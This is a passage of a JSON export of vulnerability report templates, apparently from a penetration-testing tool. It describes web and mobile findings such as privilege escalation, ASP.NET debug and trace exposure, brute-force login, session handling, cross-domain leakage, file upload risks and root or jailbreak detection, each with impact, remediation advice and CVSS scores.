09:25:24","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":803,"plugin_id":null,"title":"Vertical Privilege Escalation","type":null,"description":"The application allows unauthenticated or lower privileged users to access resources or perform actions which should only be available to a higher level account. This usually occurs when the server does not perform entitlement checks on each request to ensure that the user has the appropriate privileges before executing the request, or when those checks are being made based on values that can be tampered with on the client-side.\n","poc":null,"impact":"Vertical privilege escalation allows an attacker who has the needed lower level of access to elevate their privileges and execute privileged actions or retrieve privileged data. Gaining elevated privileges may provide an attacker with the ability to perform actions including, but not limited to:\n--Execute administrator-level functionality from a standard user account\n--Execute transactions from an account configured for read-only access\n--Execute transactions from an account that is not entitled to perform a particular function\n\n","remediation":"Authorization should always be explicitly checked server-side to verify that the user making the request to view data or perform an action is authorized to do so.\nThis may be as simple as checking that a user is authorized to view a particular page in the application or check that the user is authorized to perform an action overall. Many other more fine-grained situations may exist depending on the application context and the complexity of the business functionality. The following are some common situations where a more fine-grained authorization check is necessary:\n--A user may be authorized to perform an action, but only against certain entities involved in the transaction. For example, a user may be authorized to perform a funds transfer from one account to another, but they may only be authorized to access certain accounts. Authorization checks must be performed to verify that the user is authorized to make a funds transfer as well as verify that the user is authorized to perform that transaction using the supplied accounts.\n--A user may be authorized to view only data tied to their own account. For example, a retail banking customer may be authorized to view the details of each of their accounts at a particular bank, but may not be authorized to view the details of other users' accounts. Authorization checks must be performed to verify that the user is authorized to view account details as well as verify that the user is authorized to view the details of the account they have requested information for.\n\n","cvss_base_score":7.9,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:S/C:C/I:C/A:N/CDP:MH/TD:ND)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:24","updated_at":"2018-11-12 09:25:24","approved":1,"v_likelihood":"Medium","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":804,"plugin_id":null,"title":"ASP.NET Debugging Enabled","type":null,"description":"ASP.NET debug mode is enabled for the application. Debug mode facilitates developer debugging by placing extra information in the application to help better monitor the application's execution. By default, debugging is disabled for ASP.NET applications.\n","poc":null,"impact":"Leaving ASP.NET debug mode enabled may result in leaked information about the application or server in use. In some cases, it may be possible to remotely trigger break-points in the .NET application, which may bring the entire system to a halt.\nFor large applications, leaving debug enabled can affect availability in the following ways:\n--Code will execute slower\n--Pages will not timeout [1]\n--Increase in memory consumption\n--Scripts and images downloaded from the WebResources.axd handler are not cached\n\n","remediation":"To disable debugging for a single application, set the debug attribute to false in the Web.config file\n<pre><code class=\"xml\"><compilation debug=\"false\" /> </pre>\nYou can also disable debug for every application on the system by modifying the Machine.config file. The following code will disable the <compilation debug=\"true\"/> switch:\n<pre><code class=\"xml\"><configuration>     <system.web>           <deployment retail=\"true\"/>     </system.web> </configuration> </pre>\n","cvss_base_score":5.8,"cvss_temporal_score":4.8,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:P/A:N/E:F/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:24","updated_at":"2018-11-12 09:25:24","approved":1,"v_likelihood":"Low","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":805,"plugin_id":null,"title":"ASP.NET Trace Viewer Enabled","type":null,"description":"ASP.NET tracing enables developers to follow a page's execution path, display diagnostic information at run time, and perform general debugging tasks. Diagnostic information includes, but is not limited to, request headers (which contain session idIDs), server authentication credentials (if applicable), remote/local IP addresses, server file paths, etc. This could allow an attacker capture credentials or an active session id which would let them impersonate a user within the application. In addition these details would give an attacker detailed information about what is going on in the application which could aid in other attacks.\n","poc":null,"impact":"\n","remediation":"Disable ASP.NET tracing in production environments. Tracing can be enabled/disabled for an entire application, or on a page by page basis. In order to disable tracing for an entire application:\n--Open the application's web.config file.\n--Find the 'trace' element which should be a child of the system.web element.\n--Set the 'enabled' attribute to false.\n\nIn order to disable tracing for a single page:\n--Find the '@Page' directive at the top of the .aspx file.\n--Set the 'trace' element to false.\n\nIt's important to highlight that the trace attribute in the @Page directive takes precedence over attributes in the web.config file. Therefore, if tracing is enabled on a page by page basis, but disabled in the web.config, tracing will still be enabled for those pages where the @Page trace element is set to true.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:N/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:24","updated_at":"2018-11-12 09:25:24","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":806,"plugin_id":null,"title":"User Passwords Can Be Guessed Through Brute Force","type":null,"description":"The application does not implement any checks to limit the number or speed of authentication attempts for a given user, allowing attackers to guess valid credentials through manual or automated brute force guessing. The amount of time needed to guess a valid set of credentials will depend on several factors including the complexity of the victims' passwords and the attacker's ability to identify valid usernames.\nTo perform a brute force attack, an attacker can leverage a tool to generate authentication attempts for a known user (or list of known users) with a large dictionary of pre-defined passwords, a string-generating algorithm, or a combination.  The tool will eventually succeed in authenticating, giving the attacker the password for the given user(s).\n","poc":null,"impact":"Brute force password guessing provides the attacker with access to valid user accounts. Once valid user account credentials are discovered, the attacker will have full access to those accounts, including sensitive information and all functionality.\n","remediation":"The application must deter repeated guessing through a combination of slowing down the attack and logging the failures. When choosing to implement mechanisms to accomplish this, it is important to consider the impact it will have on a victim as well as an attacker.  Overly stringent techniques and thresholds, such as permanently locking a user out after a relatively low number of invalid login attempts, can lead to an attacker intentionally locking out victims.  Provided the attacker has a list of all usernames that are currently valid in the application, such a Denial of Service could impact all legitimate users of the application.\nTechniques that can be adopted by the application include temporarily locking out a user after a specific number of failed login attempts, leveraging CAPTCHA or other challenges to ensure login submissions cannot be automated, monitoring the velocity of login attempts and purposefully responding slowly when a client appears to be re-submitting credentials too quickly, and permanently locking out a user. In the latter case, unlocking the account should require an out-of-band mechanism (e.g. calling a helpdesk). The above techniques can also be combined to provide a legitimate user a reasonable number of attempts to log in, while making automated attacks infeasible.\nIrrespective of what mechanisms are employed to prevent brute force attacks, the application should always log failures. These should be monitored as security events by the operations team that operates the security information and event management (SIEM) tool.\n","cvss_base_score":4.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:24","updated_at":"2018-11-12 09:25:24","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":807,"plugin_id":null,"title":"Sessions Do Not Expire on Password Change and Reset","type":"PT","description":"The web application allows the users to change or reset their account password. We discovered that application fails to expire or invalidate previously logged in sessions once the user updates the account password. If the application does not have session expiration on password change or reset, then the compromised credential can be used indefinitely by just ensuring the session doesn't timeout from inactivity.\r\nAn attacker with compromised credentials can continuously access the victim’s account by remaining active on the web application. The process of bypassing  inactivity timeout can be automated through browser plugins or via Selenium scripts.","poc":null,"impact":null,"remediation":"Upon a password reset or update, the web application must terminate all the active sessions associated with the user’s account. Additionally, an absolute session timeout (such as 24 hours) should be coupled with inactivity timeout.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-28 06:02:40","updated_at":"2018-11-28 06:03:20","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":808,"plugin_id":null,"title":"Single Sign On Session Token Not Invalidated After Logout","type":"VA","description":"The web application does not properly invalidate a user's SSO session token on the server for integrations after the user initiates logout. User SSO session token remain active on the server, and any requests submitted including the user's SSO session token will execute successfully, as though the user had made those requests.\r\nLeaving the user's SSO session token active after the user initiates logout provides the attacker with a larger window in which to steal a victim's session and impersonate that user in the integrated applications. The SSO session token can be obtained through various techniques, such as intercepting network traffic (\"Man-in-the-Middle\" or \"MitM\"), Cross-Site Scripting (XSS), Cross-Site Tracing (XST), and in the case of URL-based session token transmission, local inspection of browser history. In addition to prolonging the session identifier's exposure to attack, failing to invalidate the user's session server-side also leaves the user with no way to deny an attacker's access once the victim discovers that their session has been compromised.","poc":null,"impact":null,"remediation":"The user's SSO session token should be terminated on the server immediately after a logout action is performed. It is important to note that simply deleting the cookie from the browser will not terminate the server session. The session must be invalidated at the server, using the HTTP container's intrinsic session abandonment mechanism.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-28 06:31:07","updated_at":"2018-11-28 06:31:16","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":809,"plugin_id":null,"title":"Cross-domain POST","type":"PT","description":"Applications sometimes use POST requests to transfer sensitive information from one domain to another. This does not necessarily constitute a security vulnerability, but it creates a trust relationship between the two domains. Data transmitted between domains should be reviewed to determine whether the originating application should be trusting the receiving domain with this information.","poc":null,"impact":null,"remediation":"Applications sometimes use POST requests to transfer sensitive information from one domain to another. This does not necessarily constitute a security vulnerability, but it creates a trust relationship between the two domains. Data transmitted between domains should be reviewed to determine whether the originating application should be trusting the receiving domain with this information.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-29 11:29:51","updated_at":"2018-11-29 11:30:04","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":810,"plugin_id":null,"title":"Cross-domain Referer leakage","type":"PT","description":"When a web browser makes a request for a resource, it typically adds an HTTP header, called the \"Referer\" header, indicating the URL of the resource from which the request originated. This occurs in numerous situations, for example when a web page loads an image or script, or when a user clicks on a link or submits a form.\n\nIf the resource being requested resides on a different domain, then the Referer header is still generally included in the cross-domain request. If the originating URL contains any sensitive information within its query string, such as a session token, then this information will be transmitted to the other domain. If the other domain is not fully trusted by the application, then this may lead to a security compromise.\n\nYou should review the contents of the information being transmitted to other domains, and also determine whether those domains are fully trusted by the originating application.\n\nToday's browsers may withhold the Referer header in some situations (for example, when loading a non-HTTPS resource from a page that was loaded over HTTPS, or when a Refresh directive is issued), but this behavior should not be relied upon to protect the originating URL from disclosure.\n\nNote also that if users can author content within the application then an attacker may be able to inject links referring to a domain they control in order to capture data from URLs used within the application.","poc":"","impact":"","remediation":"Applications should never transmit any sensitive information within the URL query string. In addition to being leaked in the Referer header, such information may be logged in various locations and may be visible on-screen to untrusted parties. If placing sensitive information in the URL is unavoidable, consider using the Referer-Policy HTTP header to reduce the chance of it being disclosed to third parties.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-29 11:35:24","updated_at":"2022-01-13 02:33:47","approved":1,"v_likelihood":"Medium","v_impact":"Critical","steps_to_reproduce":"","likelihood_text":""},{"id":811,"plugin_id":null,"title":"Cross-domain script include","type":"PT","description":"When an application includes a script from an external domain, this script is executed by the browser within the security context of the invoking application. The script can therefore do anything that the application's own scripts can do, such as accessing application data and performing actions within the context of the current user.\r\n\r\nIf you include a script from an external domain, then you are trusting that domain with the data and functionality of your application, and you are trusting the domain's own security to prevent an attacker from modifying the script to perform malicious actions within your application.","poc":null,"impact":null,"remediation":"Scripts should not be included from untrusted domains. Applications that rely on third-party scripts should consider copying the contents of these scripts onto their own domain and including them from there. If that is not possible (e.g. for licensing reasons) then consider reimplementing the script's functionality within application code.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-29 11:44:06","updated_at":"2018-11-29 11:44:14","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":812,"plugin_id":null,"title":"Software Version Numbers Revealed","type":"PT","description":"Verbose server information is sent in the HTTP responses from the server. The information included in the response contains the server name, type, and version number. Displaying version information of software information could allow an attacker to determine which vulnerabilities are present in the software, particularly if an outdated software version is in use with published vulnerabilities.\nFollowing software versions are revealed.","poc":"","impact":"","remediation":"Verbose server information should be removed from all HTTP responses. This can be performed by modifying the server's configuration files or through the use and configuration of a web application firewall.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-30 10:08:17","updated_at":"2019-01-16 06:57:26","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":"","likelihood_text":""},{"id":813,"plugin_id":null,"title":"External service interaction (SMTP)","type":"PT","description":"External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. However, in many cases, it can indicate a vulnerability with serious consequences.\r\n\r\nThe ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.\r\n\r\nThe facility to generate an email to an arbitrary address is often intended application behavior. But this is not necessarily the case, particulary in cases where the destination address is not explicitly entered on-screen by the user.","poc":null,"impact":null,"remediation":"You should review the purpose and intended use of the relevant application functionality, and determine whether the ability to trigger arbitrary external service interactions is intended behavior. If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.\r\n\r\nIf the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-30 10:33:00","updated_at":"2018-11-30 10:33:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":814,"plugin_id":null,"title":"Input returned in response (reflected)","type":"PT","description":"Reflection of input arises when data is copied from a request and echoed into the application's immediate response. Input being returned in application responses is not a vulnerability on its own. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses.","poc":"","impact":"","remediation":"In general, effectively prevent any harm from input reflected in response involves a combination of the following measures:\n-- At the point where user input is received, filter as strictly as possible based on what is expected or valid input.\n-- At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.\n-- To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.\nAs a last line of defence, you can use the Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-30 10:36:30","updated_at":"2020-08-07 22:38:42","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":"","likelihood_text":""},{"id":815,"plugin_id":null,"title":"Password field with autocomplete enabled","type":"PT","description":"Most browsers have a facility to remember user credentials that are entered into HTML forms. This function can be configured by the user and also by applications that employ user credentials. If the function is enabled, then credentials entered by the user are stored on their local computer and retrieved by the browser on future visits to the same application.\r\n\r\nThe stored credentials can be captured by an attacker who gains control over the user's computer. Further, an attacker who finds a separate application vulnerability such as cross-site scripting may be able to exploit this to retrieve a user's browser-stored credentials.","poc":null,"impact":null,"remediation":"To prevent browsers from storing credentials entered into HTML forms, include the attribute autocomplete=\"off\" within the FORM tag (to protect all form fields) or within the relevant INPUT tags (to protect specific individual fields).\r\n\r\nPlease note that modern web browsers may ignore this directive. In spite of this there is a chance that not disabling autocomplete may cause problems obtaining PCI compliance.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-30 10:54:36","updated_at":"2018-11-30 10:55:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":816,"plugin_id":null,"title":"File upload functionality","type":"PT","description":"File upload functionality is commonly associated with a number of vulnerabilities, including:\r\n\r\n--File path traversal\r\n--Persistent cross-site scripting\r\n--Placing of other client-executable code into the domain\r\n--Transmission of viruses and other malware\r\n--Denial of service\r\nYou should review file upload functionality to understand its purpose, and establish whether uploaded content is ever returned to other application users, either through their normal usage of the application or by being fed a specific link by an attacker.\r\n\r\nSome factors to consider when evaluating the security impact of this functionality include:\r\n\r\n--Whether uploaded content can subsequently be downloaded via a URL within the application.\r\n--What Content-type and Content-disposition headers the application returns when the file's content is downloaded.\r\n--Whether it is possible to place executable HTML/JavaScript into the file, which executes when the file's contents are viewed.\r\n--Whether the application performs any filtering on the file extension or MIME type of the uploaded file.\r\n--Whether it is possible to construct a hybrid file containing both executable and non-executable content, to bypass any content filters - for example, a file containing both a GIF image and a Java archive (known as a GIFAR file).\r\n--What location is used to store uploaded content, and whether it is possible to supply a crafted filename to escape from this location.\r\n--Whether archive formats such as ZIP are unpacked by the application.\r\n--How the application handles attempts to upload very large files, or decompression bomb files.","poc":null,"impact":null,"remediation":"File upload functionality is not straightforward to implement securely. Some recommendations to consider in the design of this functionality include:\r\n\r\n--Use a server-generated filename if storing uploaded files on disk.\r\n--Inspect the content of uploaded files, and enforce a whitelist of accepted, non-executable content types. Additionally, enforce a blacklist of common executable formats, to hinder hybrid file attacks.\r\nEnforce a whitelist of accepted, non-executable file extensions.\r\n--If uploaded files are downloaded by users, supply an accurate non-generic Content-Type header, the X-Content-Type-Options: nosniff header, and also a Content-Disposition header that specifies that browsers should handle the file as an attachment.\r\n--Enforce a size limit on uploaded files (for defense-in-depth, this can be implemented both within application code and in the web server's configuration).\r\n--Reject attempts to upload archive formats such as ZIP.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-30 11:12:31","updated_at":"2018-11-30 11:12:38","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":817,"plugin_id":null,"title":"No Root Detection","type":"VA","description":"The android application is susceptible to no root detection. We discovered that application allows to be install in a rooted device. Rooting and unlocking are the processes of gaining unauthorized access or elevated privileges on a system. It is the process of modifying mobile operating system kernels to allow file system read and write access. Most rooting tools (and exploits) remove the limitations and security features built by the manufacturer (the \"jail\") through the use of custom kernels, which make unauthorized modifications to the operating system. Almost all rooting tools allow users to run code not approved and signed by manufacturer. This allows users to install additional applications, extensions and patches outside the control of manufacturer.            \r\nIn a Root device attacker can view full functionality and location for storage of sensitive data of the application. Attacker can also bypass security policy of not allowing Root device to enroll with the back-end APIs.","poc":null,"impact":null,"remediation":"1.\tCheck for test-keys:\r\n     i.\tCheck to see if build, prop includes the line ro_build tags=test-keys indicating a developer build or unofficial ROM\r\n\r\n2.\tCheck for OTA certificates\r\n    i.\tCheck to see if the file /etc/security/otacerts.zip exists\r\n\r\n3.\tCheck for several known rooted apk's\r\n    i.\tcom.noshufou.android.su\r\n    ii.\tcom.thirdparty.superuser\r\n    iii.\teu.chainfire.supersu\r\n    iv.\tcom.koushikdutta.superuser\r\n4.\tCheck for SU binaries\r\n    i.\t/system/bin/su\r\n    ii.\t/system/xbin/su\r\n    iii.\t/sbin/su\r\n    iv.\t/system/su\r\n    v.\t/system/bin/.ext/.su\r\n5.\tAttempt SU command directly\r\n    i.\tAttempt the to run the command su and check the id of the current user, if it returns 0 then the su command has been successful","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-12-19 06:47:54","updated_at":"2018-12-21 10:39:26","approved":1,"v_likelihood":"Minimal","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":818,"plugin_id":null,"title":"User Information Can Be Obtained By Guessing User Name/Email Through Brute Force","type":"PT","description":"The application does not implement any checks to limit the number or speed of authentication attempts for a given user, allowing attackers to guess valid credentials through manual or automated brute force guessing. The amount of time needed to guess a valid set of credentials will depend on several factors including the complexity of the victims' passwords and the attacker's ability to identify valid usernames. To perform a brute force attack, an attacker can leverage a tool to generate authentication attempts for a known user (or list of known users) with a large dictionary of pre-defined passwords, a string-generating algorithm, or a combination. The tool will eventually succeed in authenticating, giving the attacker the password for the given user(s).\nBrute force password guessing provides the attacker with access to valid user accounts. Once valid user account credentials are discovered, the attacker will have full access to those accounts, including sensitive information and all functionality.","poc":"","impact":"","remediation":"The application must deter repeated guessing through a combination of slowing down the attack and logging the failures. When choosing to implement mechanisms to accomplish this, it is important to consider the impact it will have on a victim as well as an attacker. Overly stringent techniques and thresholds, such as permanently locking a user out after a relatively low number of invalid login attempts, can lead to an attacker intentionally locking out victims. Provided the attacker has a list of all usernames that are currently valid in the application, such a Denial of Service could impact all legitimate users of the application. Techniques that can be adopted by the application include temporarily locking out a user after a specific number of failed login attempts, leveraging CAPTCHA or other challenges to ensure login submissions cannot be automated, monitoring the velocity of login attempts and purposefully responding slowly when a client appears to be re-submitting credentials too quickly, and permanently locking out a user. In the latter case, unlocking the account should require an out-of-band mechanism (e.g. calling a helpdesk). The above techniques can also be combined to provide a legitimate user a reasonable number of attempts to log in, while making automated attacks infeasible. Irrespective of what mechanisms are employed to prevent brute force attacks, the application should always log failures. These should be monitored as security events by the operations team that operates the security information and event management (SIEM) tool.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-12-20 11:03:57","updated_at":"2018-12-20 11:07:41","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":"","likelihood_text":""},{"id":819,"plugin_id":null,"title":"Passwords Reset Verification Code Can Be Guessed Through Brute Force","type":"PT","description":"The application does not implement any checks to limit the number or speed of authentication attempts for a given user, allowing attackers to guess valid credentials through manual or automated brute force guessing. The amount of time needed to guess a valid set of credentials will depend on several factors including the complexity of the victims' passwords and the attacker's ability to identify valid usernames. To perform a brute force attack, an attacker can leverage a tool to generate authentication attempts for a known user (or list of known users) with a large dictionary of pre-defined passwords, a string-generating algorithm, or a combination. The tool will eventually succeed in authenticating, giving the attacker the password for the given user(s).\r\nBrute force password guessing provides the attacker with access to valid user accounts. Once valid user account credentials are discovered, the attacker will have full access to those accounts, including sensitive information and all functionality.","poc":null,"impact":null,"remediation":"The application must deter repeated guessing through a combination of slowing down the attack and logging the failures. When choosing to implement mechanisms to accomplish this, it is important to consider the impact it will have on a victim as well as an attacker. Overly stringent techniques and thresholds, such as permanently locking a user out after a relatively low number of invalid login attempts, can lead to an attacker intentionally locking out victims. Provided the attacker has a list of all usernames that are currently valid in the application, such a Denial of Service could impact all legitimate users of the application. Techniques that can be adopted by the application include temporarily locking out a user after a specific number of failed login attempts, leveraging CAPTCHA or other challenges to ensure login submissions cannot be automated, monitoring the velocity of login attempts and purposefully responding slowly when a client appears to be re-submitting credentials too quickly, and permanently locking out a user. In the latter case, unlocking the account should require an out-of-band mechanism (e.g. calling a helpdesk). The above techniques can also be combined to provide a legitimate user a reasonable number of attempts to log in, while making automated attacks infeasible. Irrespective of what mechanisms are employed to prevent brute force attacks, the application should always log failures. These should be monitored as security events by the operations team that operates the security information and event management (SIEM) tool.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-12-20 11:10:13","updated_at":"2018-12-21 10:39:24","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":820,"plugin_id":null,"title":"Root/Jailbreak Detection Bypass (iOS) (Android)","type":"PT","description":"The mobile application is susceptible to Root/Jailbreak detection bypass attack. Jailbreaking, rooting and unlocking are the processes of gaining unauthorized access or elevated privileges on a system. Jailbreaking/Rooting is the process of modifying mobile operating system kernels to allow file system read and write access. Most jailbreaking/rooting tools (and exploits) remove the limitations and security features built by the manufacturer (the \"jail\") through the use of custom kernels, which make unauthorized modifications to the operating system. Almost all jailbreaking/rooting tools allow users to run code not approved and signed by the manufacturer. This allows users to install additional applications, extensions, and patches outside the control of the manufacturer.","poc":"","impact":"","remediation":"For iOS:\nApple does not provide an API for detecting Jailbroken devices, so each application must create its own proprietary solution. Care should be taken to layer in jailbreak detection with binary hardening controls in order to make it more challenging for an attacker to reverse engineer the jailbreak detection mechanisms. Otherwise, attackers who reverse engineer the jailbreak detection mechanisms will be able to implement a \"bypass,\" which can \"trick\" a solution into thinking that a jailbroken device is actually not jailbroken.\nWhen considering a jailbreak detection solution, a \"multi-level set of controls\" solution should be implemented that includes binary hardening controls such as control flow obfuscation, anti-debug controls and anti-tamper controls. With a \"multi-level set of controls\" solution, an attacker must circumvent multiple controls to accomplish the goal. Placing these controls in a specific order increases the required complexity of a successful attack. An attacker may attempt to patch out a jailbreak detection mechanism; however, an anti-tamper control may then prevent the application from running. The attacker may need to attach a debugger to understand how the anti-tamper mechanism works; however, an anti-debug control may then make the application crash. The attacker may attempt to statically analyse the binary to understand the anti-debug control; however, obfuscation might make that difficult.\nAttackers can easily use Reverse Engineering techniques to determine the jailbreak detection controls implemented by an application. Therefore, for areas of code that implement sensitive functionality like this, the application should utilize obfuscation to make it harder for the attacker to reverse engineer it. There are many open source and commercial products available to make obfuscating native code easier for iOS. Additionally, C obfuscators are more mature than obfuscators for Objective-C. So, extremely sensitive operations such as cryptography, jailbreak detection, and certificate pinning should ideally be written in C and obfuscated.\nIt should be noted that jailbreak detection bypass will always be a possible if the attacker has enough time and resources. It is a matter of raising the bar, to deter would-be attackers.\nWith that in mind, the goal should be to make it as difficult as possible to reduce the risk to an acceptable level for the business.\nSome examples of security controls and implementation characteristics for performing jailbreak detection are:\n-- Verify the existence of and/or attributes of files and directories only present on jailbroken devices. Examples of files and directories to examine include Cydia related files (e.g. /Applications/Cydia.app), Mobile Substrate related files (e.g. /Library/MobileSubstrate/MobileSubstrate.dylib), Additional system binaries (e.g. /bin/bash, /usr/bin/ssh), and additional system directories (e.g. /etc/apt, /Library/MobileSubstrate)\n-- Instead of using standard library APIs, utilize inline assembly to call the associated system call via supervisor instructions (SVC). The system calls (e.g. open, read, link, etc.) can be used in the same way the respective standard library APIs would to check for the presence of certain filesystem entities. This technique is harder to hook and bypass than standard library usage.\n-- Determine whether only the expected libraries are loaded in the application address space. A whitelist approach can be used, but care needs to be taken to avoid false positives. For example, when accessibility mode is in use, certain additional libraries will be present in memory. Additionally, future iOS updates may introduce additional runtime libraries. Ensure libraries such as MobileSubstrate.dylib and libcycript.dylib do not exist in memory.\n-- Determine if key functions have been replaced (swizzled). One such technique to do so is to look up Objective-C classes using objc_lookUpClass() and obtain its methods using class_copyMethodList. The application can then iterate through each function, and determine whether the implementation exists within the expected library or application image (using dladdr()).\n-- Determine the ability for the device to process specific URL Schemes (limited with iOS 9+). Utilize the canOpenURL API to determine if Cydia is installed, using the Cydia URL scheme: cydia://package/com.example.package\n-- Detect binary signature issues. Obtain the application's code signing signature, and verify that the application has not been re-signed.\n-- Obfuscate any strings used during detection (such as filenames sent to stat(), open() methods). Strings should be decrypted at the time of use, not at application load. Plaintext strings should be removed from memory after use.\n-- Use inline C functions to do detection logic (Do not have an Objective C or even C function that returns a Boolean result as this is easy to bypass)\n-- Perform logic to determine the existence of Environment Variables and possibly the loaded library list and look for specific library injection type values. Examples include utilizing getenv() to check for the presence of Mobile Substrate related environment variables.\n-- Perform logic to determine if functions are hooked using dlsym. For example, the dlsym() API can be used to verify that a particular symbol exists within a library, and to obtain its address. This is useful to detect library preload style attacks, whereby replacement function implementations are included in pre-loaded libraries.\n-- De-couple detection and reaction as completely as possible, so that attackers can't easily determine the cause of application failure/shutdown.\n-- Distribute detection mechanisms throughout the application, and utilize in-lining to ensure that there's no single point of failure.\n-- Utilize code obfuscation to increase the complexity of reverse engineering the application.\n-- Enforce an MDM/MAM detection and monitor for anomalies (if MDM/MAM is used).\n-- Send encrypted (preferably) or encoded (make it difficult to detect) detection state results back to the server-side and enforce 